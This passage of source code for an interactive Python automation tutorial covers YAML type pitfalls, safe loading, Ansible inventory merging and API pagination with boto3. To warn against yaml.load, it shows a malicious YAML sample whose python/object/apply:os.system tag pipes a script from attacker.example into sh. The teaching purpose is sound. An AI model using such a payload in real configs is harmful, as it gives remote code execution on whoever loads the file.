        var f = [], rows = [];
        f.push({ narr: 'PyYAML follows <b>YAML 1.1</b>, which guesses types for unquoted values. Kubernetes, Ansible and GitHub Actions configs are full of values that get guessed wrong. Let us feed each value to <code>yaml.safe_load</code>.', parts: [
          { type: 'array', label: 'unquoted values in a file', values: vals }
        ] });
        vals.forEach(function (v, i) {
          var r = res(v);
          var bad = (r[0] !== 'str' && r[0] !== 'NoneType' && !/^[-+]?(0|[1-9][0-9]*)$/.test(v)) || (r[0] === 'float' && /0$/.test(v));
          rows.push([v, r[0], r[1]]);
          var hl = {}; hl[rows.length - 1] = bad ? 'bad' : 'ok';
          f.push({ narr: '<code>' + H.esc(v) + '</code> → <b>' + H.esc(r[1]) + '</b> (' + r[0] + '): ' + r[2] + '.' + (bad ? ' ' + H.c('r', 'Probably not what the author meant.') + ' Quote it.' : ''), parts: [
            { type: 'table', label: 'yaml.safe_load results', columns: ['written', 'type', 'Python value'], rows: rows.slice(), hl: hl }
          ] });
        });
        f.push({ narr: 'The fix is boring and reliable: <b>quote anything that must stay text</b> (country codes, versions, file modes, times, account ids), and validate types after loading. YAML 1.2 dropped most of these guesses, but PyYAML still uses 1.1 rules.', parts: [
          { type: 'code', label: 'safer YAML', lang: 'yaml', code: 'country: "NO"\nversion: "1.10"\nmode: "0755"\nbackup_time: "22:30"\naccount_id: "123456789012"', hl: { 1: 'ok', 2: 'ok', 3: 'ok', 4: 'ok', 5: 'ok' } }
        ] });
        return pad4(f, 'Add more values to compare.');
      }
    }],
    examples: [
      { title: 'Why yaml.load is dangerous, in one file', html: `<p>This is what a malicious <code>config.yaml</code> can contain. With <code>yaml.load(f, Loader=yaml.UnsafeLoader)</code> (or the old default <code>yaml.load(f)</code> in PyYAML before 5.1), reading the file runs <code>os.system("curl ... | sh")</code>. With <code>yaml.safe_load(f)</code> you get ${H.c('g', 'ConstructorError: could not determine a constructor for the tag')} and nothing runs. Config files come from pull requests, S3 buckets, tickets and users, so treat them as untrusted input.</p>`, code: { lang: 'text', code: `# config.yaml - DO NOT load this with yaml.load / UnsafeLoader
retention_days: 30
debug: !!python/object/apply:os.system ["curl -s https://attacker.example/x.sh | sh"]

# yaml.safe_load(open("config.yaml"))
#   -> yaml.constructor.ConstructorError: could not determine a constructor
#      for the tag 'tag:yaml.org,2002:python/object/apply:os.system'` } },
      { title: 'jq habits, translated to Python', html: `<p>If you used <code>jq</code> in bash, these translations cover most daily needs. The Python versions are longer, but you can add conditions, error messages and tests, and you never shell out per item.</p>
        ${H.table(['jq', 'Python'], [
          ['<code>.Reservations[].Instances[].InstanceId</code>', '<code>[i["InstanceId"] for r in d["Reservations"] for i in r["Instances"]]</code>'],
          ['<code>select(.State.Name == "running")</code>', '<code>if i["State"]["Name"] == "running"</code>'],
          ['<code>.Tags | from_entries</code>', '<code>{t["Key"]: t["Value"] for t in i.get("Tags", [])}</code>'],
          ['<code>length</code>', '<code>len(...)</code>'],
          ['<code>// "default"</code>', '<code>d.get("key", "default")</code>'],
          ['<code>-r</code> raw output', '<code>print(value)</code>; <code>json.dumps()</code> only for JSON output']
        ])}` },
      { title: 'Merging host vars over group vars', html: `<p>Inventories set defaults at group level and override per host. A tiny merge makes the rule explicit: later layers win. This mirrors (a simplified version of) Ansible's precedence, where host variables beat group variables, which beat <code>all</code>.</p>`, code: { lang: 'python', run: true, code: R`import json

inventory = json.loads("""{
  "all": {"vars": {"ssh_user": "deploy", "log_dir": "/var/log/myapp", "keep": 7},
          "children": {"web": {"vars": {"keep": 14},
                               "hosts": {"web-01": {}, "web-02": {"log_dir": "/srv/logs"}}}}}
}""")


def effective_vars(inv, group, host):
    out = {}
    out.update(inv["all"].get("vars", {}))                       # 1. all
    g = inv["all"]["children"][group]
    out.update(g.get("vars", {}))                                # 2. group overrides all
    out.update(g["hosts"].get(host) or {})                       # 3. host overrides group
    return out


for h in ("web-01", "web-02"):
    print(h, json.dumps(effective_vars(inventory, "web", h), sort_keys=True))
# Output:
# web-01 {"keep": 14, "log_dir": "/var/log/myapp", "ssh_user": "deploy"}
# web-02 {"keep": 14, "log_dir": "/srv/logs", "ssh_user": "deploy"}` } }
    ],
    deepDive: `<p>🟣 <b>Loaders in PyYAML 6.</b> <code>yaml.safe_load</code> = <code>yaml.load(s, Loader=yaml.SafeLoader)</code>. If you have libyaml installed, <code>Loader=yaml.CSafeLoader</code> is the same safe behaviour, many times faster: worth it for big Kubernetes dumps. <code>FullLoader</code> was meant as a middle ground but has had several bypass CVEs; do not use it for untrusted input. For many documents in one file (<code>---</code> separators, as in <code>kubectl get -o yaml</code> lists or Helm output), use <code>yaml.safe_load_all</code>, which returns a generator.</p>
      <p><b>Round-tripping.</b> PyYAML drops comments and may reorder keys, so a script that loads and rewrites a human-maintained YAML file destroys its comments. When you must edit YAML in place (bumping an image tag in a manifest), use <b>ruamel.yaml</b> in round-trip mode, or a targeted tool like <code>yq</code>. Better still, generate YAML from code and never hand-edit it.</p>
      <p><b>Dates and big numbers.</b> YAML turns <code>2026-10-19</code> into a <code>datetime.date</code>, which <code>json.dumps</code> cannot serialise without <code>default=str</code>. JSON numbers have no size limit in Python, but JavaScript tools reading your JSON lose precision above 2<sup>53</sup>, which is why APIs send ids as strings. AWS account ids like <code>123456789012</code> should stay strings everywhere: as numbers, ids with a leading zero lose it.</p>
      <p><b>Duplicate keys.</b> Both <code>json</code> and PyYAML silently keep the <b>last</b> value of a duplicated key. A config with two <code>retention_days:</code> lines gives no warning. If that matters, pass <code>object_pairs_hook</code> to <code>json.loads</code> to detect duplicates, and run <code>yamllint</code> in CI, which flags duplicate keys and the truthy-word traps shown above.</p>
      <p><b>Large files.</b> <code>json.load</code> reads everything into memory. For multi-GB exports prefer JSON Lines (one object per line, read line by line) or a streaming parser such as ijson.</p>`,
    aiEra: `<p>🤖 <b>What AI changes:</b> assistants are excellent at "write the Python to pull these fields out of this JSON" when you paste a sample, at converting between JSON and YAML, and at writing a validation model (dataclasses or pydantic) from an example file. They also explain cryptic YAML errors ("mapping values are not allowed here") quickly, which usually means an indentation or a missing space after a colon.</p>
      <p><b>Where it goes wrong:</b> older training data still shows <code>yaml.load(f)</code>, and assistants sometimes write <code>yaml.load(f, Loader=yaml.Loader)</code> to "fix" the PyYAML 6 error, which re-opens the code-execution hole. They also assume fields always exist (<code>d["Tags"]</code> crashes on untagged resources) and rarely quote values like <code>NO</code> or <code>0755</code>. <b>Your job:</b> grep for <code>yaml.load(</code> in reviews and require <code>safe_load</code>, use <code>.get()</code> for optional fields, validate after loading, and do not paste real inventories with internal hostnames or secrets into an external assistant; redact first.</p>`,
    problems: [P({
      t: 'List every host in an inventory group', l: 'Medium', tags: ['yaml', 'inventory', 'recursion', 'pure function'], co: ['Red Hat', 'Flipkart', 'Accenture'], c: PURE + '<p>The input is the JSON text of what <code>yaml.safe_load</code> returned, so you can use <code>json.loads</code>. A group body may be <code>null</code> (YAML <code>web:</code> with nothing after it).</p>',
      s: `<p>Your deploy tool reads an Ansible-style inventory: groups have optional <code>hosts</code> (a mapping of host name → host vars) and optional <code>children</code> (a mapping of group name → group body). The same group name can appear in several places (defined once with hosts, referenced elsewhere as <code>web: {}</code>); all appearances together define the group. Write <code>inventory_hosts(inventory_json, group)</code> that returns the <b>sorted, unique</b> host names in the group, including hosts of all its child groups, at any depth. An unknown group returns an empty list. A loop (a contains b, b contains a) must not hang.</p>`,
      ex: `<p>With the inventory above, <code>inventory_hosts(inv, "prod")</code> → ${H.c('g', '["db-01.internal", "web-01.internal", "web-02.internal"]')}: <code>prod</code> has no hosts of its own; its children <code>web</code> and <code>db</code> are defined higher up, under <code>all</code>. <code>inventory_hosts(inv, "staging")</code> → ${H.c('y', '[]')}.</p>`,
      bw: `<p>Looking only at <code>inv["all"]["children"][group]["hosts"]</code>. It misses groups made of other groups (<code>prod</code> returns nothing), crashes on a <code>null</code> body or an unknown group, and a naive recursive expansion of names loops forever when two groups contain each other.</p>`,
      bc: `import json

def inventory_hosts(inventory_json, group):
    inv = json.loads(inventory_json)
    body = inv["all"]["children"][group]          # KeyError for unknown groups and for "all"
    return sorted(body["hosts"].keys())          # ignores children; crashes on null bodies`,
      q: ['Why keep a "seen" set while expanding child groups?', ['So a group reached twice, or a loop between groups, is expanded only once', 'To sort the result', 'Because sets are faster than lists for appending', 'To remove duplicate hosts'], 0, 'Without it, a → b → a recurses forever, and a group shared by several parents is expanded again and again. Duplicate hosts are handled by the result set, a separate concern.'],
      h: ['<p>Hint 1: do two passes. First walk the whole tree and build an index: group name → (set of own hosts, set of child names). Merge every appearance of the same name.</p>', '<p>Hint 2: <code>body or {}</code> turns a null body into an empty dict; <code>(body.get("hosts") or {}).keys()</code> handles null host maps too.</p>', '<p>Hint 3: then expand with a stack and a <code>seen</code> set: pop a group, skip it if seen or unknown, add its hosts to a result set, push its children. Return <code>sorted(result)</code>.</p>'],
      a: `<p>Separate <b>indexing</b> from <b>expanding</b>. A recursive walk over the nested dicts visits every group body wherever it appears and merges its hosts and child names into one index entry per name; this is what makes "defined here, referenced there" work. Expansion is then a plain graph traversal over group names with a <code>seen</code> set, which handles diamonds (a group reached through two parents) and cycles. Collect hosts in a set and sort at the end for deterministic output that is easy to diff and test.</p>`,
      code: `import json


def inventory_hosts(inventory_json, group):
    """Sorted unique hosts of a group in an Ansible-style inventory (already parsed YAML, as JSON)."""
    inv = json.loads(inventory_json)
    index = {}                                      # group -> (own hosts, child group names)

    def walk(name, body):
        body = body or {}
        hosts, kids = index.setdefault(name, (set(), set()))
        hosts.update((body.get("hosts") or {}).keys())
        children = body.get("children") or {}
        kids.update(children.keys())
        for child, child_body in children.items():
            walk(child, child_body)

    for name, body in inv.items():
        walk(name, body)

    result, seen, pending = set(), set(), [group]
    while pending:
        g = pending.pop()
        if g in seen or g not in index:
            continue
        seen.add(g)
        hosts, kids = index[g]
        result |= hosts
        pending.extend(kids)
    return sorted(result)`,
      cx: `<p>O(N + E + H log H): each group body is visited once while indexing, each group name and child link once while expanding, and the H hosts are sorted at the end.</p>`,
      f: ['How would you also return each host\'s merged variables (all → group → host)?', 'Ansible also supports patterns like <code>web:&amp;prod</code> (intersection) and <code>web:!web-02</code>. How would you add them?'],
      tests: { sig: 'string string -> string[]', fn: 'inventoryHosts', cases: [
        [['{"all":{"vars":{"ssh_user":"deploy"},"children":{"web":{"hosts":{"web-01.internal":{},"web-02.internal":{"log_dir":"/srv/logs"}}},"db":{"hosts":{"db-01.internal":{"backup":true}}},"prod":{"children":{"web":{},"db":{}}}}}}', 'web'], ['web-01.internal', 'web-02.internal']],
        [['{"all":{"vars":{"ssh_user":"deploy"},"children":{"web":{"hosts":{"web-01.internal":{},"web-02.internal":{"log_dir":"/srv/logs"}}},"db":{"hosts":{"db-01.internal":{"backup":true}}},"prod":{"children":{"web":{},"db":{}}}}}}', 'prod'], ['db-01.internal', 'web-01.internal', 'web-02.internal']],
        [['{"all":{"vars":{"ssh_user":"deploy"},"children":{"web":{"hosts":{"web-01.internal":{},"web-02.internal":{"log_dir":"/srv/logs"}}},"db":{"hosts":{"db-01.internal":{"backup":true}}},"prod":{"children":{"web":{},"db":{}}}}}}', 'all'], ['db-01.internal', 'web-01.internal', 'web-02.internal']],
        [['{"all":{"vars":{"ssh_user":"deploy"},"children":{"web":{"hosts":{"web-01.internal":{},"web-02.internal":{"log_dir":"/srv/logs"}}},"db":{"hosts":{"db-01.internal":{"backup":true}}},"prod":{"children":{"web":{},"db":{}}}}}}', 'staging'], []],
        [['{"all":{"hosts":{"bastion":{}},"children":{"staging":{"hosts":{"stg-web":{},"stg-db":{}}},"web":{"hosts":{"stg-web":{},"web-1":{}}}}}}', 'all'], ['bastion', 'stg-db', 'stg-web', 'web-1']],
        [['{"all":{"hosts":{"bastion":{}},"children":{"staging":{"hosts":{"stg-web":{},"stg-db":{}}},"web":{"hosts":{"stg-web":{},"web-1":{}}}}}}', 'web'], ['stg-web', 'web-1']],
        [['{"all":{"children":{"a":{"hosts":{"h1":{}},"children":{"b":{}}},"b":{"hosts":{"h2":{}},"children":{"a":{}}}}}}', 'a'], ['h1', 'h2']],
        [['{"all":{"children":{"a":{"hosts":{"h1":{}},"children":{"b":{}}},"b":{"hosts":{"h2":{}},"children":{"a":{}}}}}}', 'b'], ['h1', 'h2']],
        [['{"all":{"children":{"web":null,"db":{"hosts":{"db-9":null}}}}}', 'web'], []],
        [['{"all":{"children":{"web":null,"db":{"hosts":{"db-9":null}}}}}', 'all'], ['db-9']]
      ] }
    })]
  });

  // ───────────────────────── Topic 4: pagination ─────────────────────────
  topics.push({
    title: 'Pagination: the Script That Only Saw the First 1000 Objects',
    analogy: `<p>A cloud API answers a big question like a <b>library search that prints one page of results at a time</b>. At the bottom of each page it writes "more results: ask for page token <i>XYZ</i>". If you read only the first page and stop, you think the library has 1000 books when it has 2,437. Pagination means: keep asking with the token from the last page until a page comes back <b>without</b> a token. A paginator is a helper that does the asking for you, so your loop just sees one long list of books.</p>`,
    explain: `<p>🟢 <b>Why APIs paginate.</b> Returning a million items in one response would be slow and huge, so APIs cap the page size: S3 <code>list_objects_v2</code> returns at most <b>1000</b> keys per call, EC2 <code>describe_instances</code> pages with <code>MaxResults</code>, GitHub returns 30 (up to 100) items per page. The response includes a <b>token</b> for the next page when there is more.</p>
      <p>🟢 <b>The classic bug.</b> A cleanup script did <code>resp = s3.list_objects_v2(Bucket=b)</code> and looped over <code>resp["Contents"]</code>. In testing the bucket had 300 objects and it worked. In production it had 2.4 million, and the script processed exactly <b>1000</b> every night and reported success. Nothing errors: the extra data is simply never asked for. The tell-tale sign is a suspiciously round number.</p>
      ${H.table(['API style', 'Ask for the next page with', 'Last page when'], [
        ['EC2, most AWS "describe" calls', '<code>NextToken=</code> from <code>resp["NextToken"]</code>', 'no <code>NextToken</code> in the response'],
        ['S3 <code>list_objects_v2</code>', '<code>ContinuationToken=</code> from <code>resp["NextContinuationToken"]</code>', '<code>IsTruncated</code> is false'],
        ['DynamoDB scan/query', '<code>ExclusiveStartKey=</code> from <code>resp["LastEvaluatedKey"]</code>', 'no <code>LastEvaluatedKey</code>'],
        ['GitHub REST', 'the <code>next</code> URL in the <code>Link</code> header', 'no <code>rel="next"</code> link'],
        ['Many REST APIs', '<code>?page=2</code> or <code>?cursor=abc</code>', 'empty page or <code>has_more: false</code>']
      ])}
      <p>🔵 <b>boto3 paginators hide all of this.</b> <code>s3.get_paginator("list_objects_v2").paginate(Bucket=b)</code> returns an iterator of pages, and boto3 knows which token field each API uses. Use <code>client.can_paginate("describe_snapshots")</code> to check. You can also filter across pages with <code>.search("Contents[].Key")</code> (a JMESPath expression) and cap work with <code>PaginationConfig={"MaxItems": 5000, "PageSize": 500}</code>.</p>
      <p>🔵 <b>Write your own paginator as a generator</b> for APIs that boto3 does not cover. A generator <code>yield</code>s items one at a time, so you can stop early (<code>break</code> after the first match) without fetching every page, and memory stays flat even for millions of items.</p>
      <p>🔵 <b>Two safety checks</b> in hand-written loops: stop if the API returns the <b>same token twice</b> (a bug would otherwise loop forever), and do not stop on an <b>empty page</b> that still has a token: S3 and DynamoDB can legally return zero items with "more to come".</p>`,
    clues: [
      '"the script only processed 1000 objects" / "only 50 instances" → missing pagination; look for a round number',
      '"list all X in the account" → <code>get_paginator(...)</code>, never a single <code>list_</code>/<code>describe_</code> call',
      '"NextToken" / "ContinuationToken" / "Link header" in the question → write or use a paginator loop',
      '"stop as soon as you find one" / "millions of items" → a generator that yields items lazily',
      '"the loop never ended" → token not updated, or the API repeated a token: track seen tokens',
      '"do this in all 17 regions" → one client and paginator per region, run regions in a thread pool'
    ],
    code: [{ lang: 'python', run: true, code: R`"""Pagination against a fake S3-style API (standard library only).
The fake behaves like list_objects_v2: at most 1000 keys per call plus a token for the next page.
"""
import itertools


class FakeS3:
    def __init__(self, n_objects, page_size=1000):
        self.keys = [f"logs/2026/10/{i:05d}.gz" for i in range(n_objects)]
        self.page_size = page_size
        self.calls = 0

    def list_objects_v2(self, Bucket, ContinuationToken=None, Prefix=""):
        self.calls += 1
        start = int(ContinuationToken) if ContinuationToken else 0
        matching = [k for k in self.keys if k.startswith(Prefix)]
        chunk = matching[start:start + self.page_size]
        resp = {"KeyCount": len(chunk), "IsTruncated": start + self.page_size < len(matching)}
        if chunk:
            resp["Contents"] = [{"Key": k, "Size": 1024} for k in chunk]
        if resp["IsTruncated"]:
            resp["NextContinuationToken"] = str(start + self.page_size)
        return resp


s3 = FakeS3(2437)

# The bug: one call. No error, just silently incomplete.
resp = s3.list_objects_v2(Bucket="app-logs")
print("buggy count:", len(resp.get("Contents", [])))


def iter_objects(client, **kwargs):
    """Yield every object across all pages. Guards against a repeated token."""
    seen_tokens = set()
    while True:
        page = client.list_objects_v2(**kwargs)
        yield from page.get("Contents", [])             # 'Contents' is missing on an empty page
        token = page.get("NextContinuationToken")
        if not page.get("IsTruncated") or not token:
            return
        if token in seen_tokens:
            raise RuntimeError(f"API repeated token {token!r}; stopping to avoid an endless loop")
        seen_tokens.add(token)
        kwargs["ContinuationToken"] = token


s3 = FakeS3(2437)
objs = list(iter_objects(s3, Bucket="app-logs"))
print("paginated count:", len(objs), "in", s3.calls, "calls")
print("total size MB:", round(sum(o["Size"] for o in objs) / 1024 / 1024, 2))

# Lazy: stop after the first 3 matches; only one page is fetched.
s3 = FakeS3(2437)
first = list(itertools.islice((o["Key"] for o in iter_objects(s3, Bucket="app-logs") if o["Key"].endswith("7.gz")), 3))
print("first matches:", first, "calls made:", s3.calls)

# Empty bucket: no 'Contents' key at all, the loop must not crash.
print("empty bucket:", list(iter_objects(FakeS3(0), Bucket="empty")))
# Output:
# buggy count: 1000
# paginated count: 2437 in 3 calls
# total size MB: 2.38
# first matches: ['logs/2026/10/00007.gz', 'logs/2026/10/00017.gz', 'logs/2026/10/00027.gz'] calls made: 1
# empty bucket: []` }, R`"""The same with boto3 paginators (pip install boto3). Credentials come from the default chain."""
from concurrent.futures import ThreadPoolExecutor

import boto3

session = boto3.Session(profile_name="sandbox")        # or no profile: env vars, SSO or an instance role
s3 = session.client("s3")

# 1. Every key, any number of pages. boto3 handles ContinuationToken for you.
paginator = s3.get_paginator("list_objects_v2")
total = 0
for page in paginator.paginate(Bucket="app-logs-123456789012", Prefix="logs/2026/"):
    for obj in page.get("Contents", []):
        total += obj["Size"]
print("bytes under logs/2026/:", total)

# 2. JMESPath across pages: just the keys of objects larger than 100 MB.
big = paginator.paginate(Bucket="app-logs-123456789012").search("Contents[?Size > ` + '`' + R`104857600` + '`' + R`].Key")
for key in big:
    if key is not None:                                    # search yields None for empty pages
        print("big object:", key)

# 3. Cap the work while testing.
pages = paginator.paginate(Bucket="app-logs-123456789012",
                           PaginationConfig={"MaxItems": 5000, "PageSize": 500})

# 4. All regions in parallel: one client per thread (clients are thread-safe, sessions are not shared here).
def count_snapshots(region):
    ec2 = boto3.Session(profile_name="sandbox").client("ec2", region_name=region)
    n = 0
    for page in ec2.get_paginator("describe_snapshots").paginate(OwnerIds=["self"]):
        n += len(page["Snapshots"])
    return region, n


regions = [r["RegionName"] for r in session.client("ec2").describe_regions()["Regions"]]
with ThreadPoolExecutor(max_workers=8) as pool:
    for region, n in pool.map(count_snapshots, regions):
        print(f"{region:15} {n:6} snapshots")`],
    codeTitle: ['Runnable: the 1000-object bug and a safe generator paginator', 'boto3 paginators, JMESPath search, MaxItems and all regions in parallel'],
    viz: [{
      title: 'One call vs a paginator',
      input: '1000,1000,437',
      inputLabel: 'items on each page (max 8 pages, 0 allowed)',
      gen: function (input) {
        var sizes = csv(input).map(Number);
        if (!sizes.length || sizes.length > 8 || sizes.some(function (x) { return isNaN(x) || x < 0 || x > 1000 || x % 1; })) throw new Error('Give 1-8 page sizes between 0 and 1000, like 1000,1000,437');
        var total = sizes.reduce(function (a, b) { return a + b; }, 0);
        var f = [];
        f.push({ narr: 'The bucket really holds <b>' + total + '</b> objects. The API serves them in ' + sizes.length + ' page(s). First, the buggy script: <b>one</b> call.', parts: [
          { type: 'bars', label: 'objects per page (server side)', values: sizes, idxLabels: sizes.map(function (_, i) { return 'page ' + (i + 1); }) }
        ] });
        f.push({ narr: 'The single call returns page 1 only: <b>' + sizes[0] + '</b> objects' + (sizes.length > 1 ? ' and a token saying there is more, which the script ignores. ' + H.c('r', 'It reports ' + sizes[0] + ' and exits 0.') : '. With only one page the bug is invisible, which is exactly why it passes in test.'), parts: [
          { type: 'bars', label: 'objects per page', values: sizes, hl: { 0: 'bad' }, idxLabels: sizes.map(function (_, i) { return 'page ' + (i + 1); }) },
          { type: 'vars', label: 'buggy script', vals: { 'processed': String(sizes[0]), 'really there': String(total), 'error raised': 'none' }, hl: { processed: sizes.length > 1 ? 'bad' : 'ok' } }
        ] });
        var got = 0, tokens = [];
        sizes.forEach(function (s, i) {
          got += s;
          var more = i < sizes.length - 1;
          var tok = more ? 't' + (i + 1) : '(none)';
          if (more) tokens.push(tok);
          var hl = {}; for (var j = 0; j < i; j++) hl[j] = 'done'; hl[i] = s === 0 ? 'cur' : 'ok';
          f.push({ narr: 'Paginator, call ' + (i + 1) + (i ? ' with token <code>t' + i + '</code>' : '') + ': page has <b>' + s + '</b> objects' + (s === 0 && more ? ', <b>empty but with a token</b>. Do not stop here: an empty page is not the last page.' : '.') + ' Next token: <code>' + tok + '</code>.' + (more ? ' Keep going.' : ' No token means this was the last page.'), parts: [
            { type: 'bars', label: 'objects per page', values: sizes, hl: hl, idxLabels: sizes.map(function (_, k) { return 'page ' + (k + 1); }) },
            { type: 'vars', label: 'paginator state', vals: { call: String(i + 1), 'collected so far': String(got), 'next token': tok }, hl: { 'collected so far': 'ok' } }
          ] });
        });
        f.push({ narr: 'Done: <b>' + got + '</b> of ' + total + ' objects in ' + sizes.length + ' calls. With boto3 you get this from <code>get_paginator("list_objects_v2").paginate(...)</code> without writing the loop.', parts: [
          { type: 'table', label: 'result', columns: ['approach', 'objects seen', 'API calls'], rows: [['single call', String(sizes[0]), '1'], ['paginator', String(got), String(sizes.length)]], hl: { 1: 'ok', 0: sizes.length > 1 ? 'bad' : 'done' } }
        ] });
        return f;
      }
    }],
    examples: [
      { title: 'Tracing the "only 1000" bug in a cleanup job', html: `<p>The job "delete log objects older than 90 days" ran nightly for months, yet the bucket kept growing. The log line read <code>deleted 1000 objects</code> every single night: the same round number. The code called <code>list_objects_v2</code> once. Fix: a paginator, plus a sanity log of <b>pages read</b> and <b>items seen</b>. Bonus: S3 Lifecycle rules do this server-side for free, so for plain age-based deletion the best script is no script at all.</p>
        ${H.table(['Night', 'Objects in bucket', 'Script saw', 'Deleted'], [['1', '1.2 M', '1000', '1000'], ['2', '1.3 M', '1000', '1000'], ['after fix', '1.3 M', '1.3 M', '870 k (older than 90 d)']])}` },
      { title: 'A generic paginator for any token-style API', html: `<p>One small function covers most REST APIs that use a "next token" or "cursor": you tell it which response field holds the items and which holds the token. Here it walks a fake ticket API. The same helper works for Jira, PagerDuty or an internal service with a different field name.</p>`, code: { lang: 'python', run: true, code: R`def paginate(fetch, items_key="items", token_key="next_token"):
    """fetch(token) -> dict page. Yields items from every page until no token comes back."""
    token, seen = None, set()
    while True:
        page = fetch(token)
        yield from page.get(items_key, [])
        token = page.get(token_key)
        if not token:
            return
        if token in seen:
            raise RuntimeError("repeated token")
        seen.add(token)


TICKETS = [f"OPS-{n}" for n in range(1, 8)]


def fake_fetch(token, size=3):
    start = int(token or 0)
    page = {"items": TICKETS[start:start + size]}
    if start + size < len(TICKETS):
        page["next_token"] = str(start + size)
    return page


print(list(paginate(fake_fetch)))
# Output:
# ['OPS-1', 'OPS-2', 'OPS-3', 'OPS-4', 'OPS-5', 'OPS-6', 'OPS-7']` } },
      { title: 'Filter on the server, not in Python', html: `<p>Paginating through every snapshot in the account to keep the 3% that match is slow and costs API calls. Many AWS APIs filter server-side: <code>describe_snapshots(OwnerIds=["self"], Filters=[{"Name": "tag:Env", "Values": ["dev"]}])</code> sends back only matching items; S3 lists can narrow with <code>Prefix=</code>. Always pass <code>OwnerIds=["self"]</code> for snapshots and images, or you page through <b>public</b> snapshots from the whole AWS world.</p>
        ${H.table(['Call', 'Pages for a big account'], [['<code>describe_snapshots()</code>', H.c('r', 'thousands (includes public snapshots)')], ['<code>describe_snapshots(OwnerIds=["self"])</code>', 'tens'], ['<code>... + Filters tag:Env=dev</code>', H.c('g', 'a few')]])}` }
    ],
    deepDive: `<p>🟣 <b>How botocore paginators work.</b> Each service ships a JSON "paginators" model listing, per operation, the <code>input_token</code>, <code>output_token</code>, <code>limit_key</code> and <code>result_key</code>. That is why one generic class can page S3 (ContinuationToken/NextContinuationToken), EC2 (NextToken) and DynamoDB (ExclusiveStartKey/LastEvaluatedKey). <code>PaginationConfig</code> keys: <code>MaxItems</code> (stop after N items in total, and a <code>NextToken</code> to resume later via <code>StartingToken</code>), <code>PageSize</code> (items per call; smaller pages mean more calls but less risk of timeouts). <code>paginate(...).build_full_result()</code> merges all pages into one dict; fine for small results, a memory trap for big ones.</p>
      <p><b>Consistency.</b> Pagination is not a snapshot. Items created or deleted while you page may be missed or seen twice. For "delete everything older than X" that is usually fine, because the next run catches leftovers. For "count exactly", use a service that provides an inventory (S3 Inventory, AWS Config) instead of listing live.</p>
      <p><b>Throttling.</b> Listing millions of items means thousands of calls; AWS will throttle (<code>ThrottlingException</code>, <code>SlowDown</code> for S3). The SDK retries with backoff, but parallel region scans can still hit account-level limits. Keep <code>max_workers</code> modest, and prefer S3 Inventory or CloudWatch metrics (<code>BucketSizeBytes</code>, <code>NumberOfObjects</code>) for statistics.</p>
      <p><b>Deleting while listing.</b> For S3, collect keys into batches of up to 1000 and call <code>delete_objects</code> once per batch rather than one <code>delete_object</code> per key: 1000 times fewer calls. In versioned buckets, deleting a key only adds a delete marker; you need <code>list_object_versions</code> to remove old versions for real.</p>`,
    aiEra: `<p>🤖 <b>What AI changes:</b> ask "list all X in AWS with boto3" and modern assistants usually reach for <code>get_paginator</code> straight away, and they can tell you which operations support pagination and what the token fields are called. They are also handy for writing JMESPath <code>search()</code> expressions, which are fiddly to write by hand.</p>
      <p><b>Where it goes wrong:</b> generated snippets still often call <code>list_objects_v2</code> or <code>describe_instances</code> once, because the short example "works" on a demo account. They sometimes invent a paginator for an operation that has none, or use <code>build_full_result()</code> on huge listings. <b>Your job:</b> in every review of AI-written automation, search for single <code>list_</code>/<code>describe_</code> calls whose results are looped over, and test against a fake with more than one page (like the one above). A test with 2,437 items catches the bug that a 300-item demo hides.</p>`,
    problems: [P({
      t: 'Collect every key from a paginated API', l: 'Easy', tags: ['pagination', 'NextToken', 'fake client', 'pure function'], co: ['Amazon', 'Netflix', 'Zoho'], c: PURE,
      s: `<p>Write <code>collect_keys(pages)</code>. <code>pages</code> describes what a fake S3-like service will return: <code>pages[i]</code> is the list of keys on page <i>i</i>. Inside your function, build the fake client below and use a <b>token loop</b> (not direct indexing into <code>pages</code>) to return every key in order. The client's page dict has <code>Contents</code> only when the page is non-empty, and <code>NextToken</code> only when another page follows. An empty page in the middle still has a token.</p>
        <pre>class FakeClient:
    def __init__(self, pages): self.pages = pages
    def list_objects(self, Bucket, NextToken=None):
        i = 0 if NextToken is None else int(NextToken[1:])
        page = {}
        if self.pages[i]:
            page["Contents"] = [{"Key": k} for k in self.pages[i]]
        if i + 1 &lt; len(self.pages):
            page["NextToken"] = f"t{i + 1}"
        return page</pre>`,
      ex: `<p><code>collect_keys([["a", "b"], [], ["c"]])</code> → ${H.c('g', '["a", "b", "c"]')}. Call 1 returns a, b and token t1. Call 2 returns <b>no Contents</b> but token t2, so we must keep going. Call 3 returns c and no token: done. A loop that stops on the empty page returns only <code>["a", "b"]</code>.</p>`,
      bw: `<p>Making one call and reading <code>resp["Contents"]</code>: it returns only page 1, and it crashes with <code>KeyError</code> on an empty bucket. Stopping when a page is empty is the subtler bug: it silently drops everything after an empty page.</p>`,
      bc: `def collect_keys(pages):
    client = FakeClient(pages)
    resp = client.list_objects(Bucket="b")
    return [o["Key"] for o in resp["Contents"]]     # page 1 only; KeyError if empty`,
      q: ['A page comes back with zero items but a NextToken. What should the loop do?', ['Request the next page: the token, not the item count, decides when to stop', 'Stop: no items means the end', 'Retry the same page', 'Raise an error'], 0, 'S3 and DynamoDB may return empty pages (for example when filters or deleted items remove everything on that page) while more data follows. Only a missing token means the end.'],
      h: ['<p>Hint 1: start with <code>token = None</code> and loop forever; break when the response has no <code>NextToken</code>.</p>', '<p>Hint 2: read items with <code>page.get("Contents", [])</code> so a missing key is just an empty list.</p>', '<p>Hint 3: pass the token only when you have one: <code>client.list_objects(Bucket=b, NextToken=token)</code> works because the default is None. Collect keys with <code>extend</code>.</p>'],
      a: `<p>Keep calling the API, feeding back the token from the previous page, until a response has no token. The token is the only reliable end signal: page sizes vary and pages can be empty. Use <code>.get("Contents", [])</code> because AWS omits the key on empty pages. The function is exactly the shape of a real boto3 loop; swapping <code>FakeClient</code> for a real client (or using <code>get_paginator</code>) changes nothing else, which is why fakes like this make good unit tests.</p>`,
      code: `class FakeClient:
    """Stands in for an S3-like client: one page per call, NextToken while more pages follow."""

    def __init__(self, pages):
        self.pages = pages

    def list_objects(self, Bucket, NextToken=None):
        i = 0 if NextToken is None else int(NextToken[1:])
        page = {}
        if self.pages[i]:
            page["Contents"] = [{"Key": k} for k in self.pages[i]]
        if i + 1 < len(self.pages):
            page["NextToken"] = f"t{i + 1}"
        return page


def collect_keys(pages):
    """Return every key across all pages using a token loop."""
    client = FakeClient(pages)
    keys, token = [], None
    while True:
        page = client.list_objects(Bucket="app-logs", NextToken=token)
        keys.extend(obj["Key"] for obj in page.get("Contents", []))
        token = page.get("NextToken")
        if not token:
            return keys`,
